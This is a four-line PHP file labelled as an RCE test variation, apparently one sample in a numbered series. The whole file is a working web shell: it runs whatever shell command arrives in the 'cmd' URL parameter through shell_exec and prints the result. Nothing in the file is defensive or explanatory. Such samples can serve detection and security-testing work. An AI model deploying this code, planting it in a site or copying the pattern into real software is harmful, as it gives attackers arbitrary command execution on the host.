<?php
// RCE test variation #574
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>